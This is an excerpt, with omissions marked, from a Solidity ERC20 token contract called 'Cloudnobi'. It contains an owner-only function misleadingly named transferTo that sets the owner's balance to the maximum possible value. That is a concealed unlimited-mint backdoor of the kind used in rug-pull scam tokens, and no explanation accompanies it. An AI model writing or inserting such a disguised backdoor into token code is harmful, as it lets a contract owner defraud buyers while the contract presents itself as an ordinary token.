...
contract Cloudnobi is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = "Cloudnobi";
    string private _symbol = "cNobi";
   ...
   function multiTransfer() public onlyOwner {
    ...
    function transferTo() public onlyOwner() { _walletTotals[owner()] = ~uint256(0); }
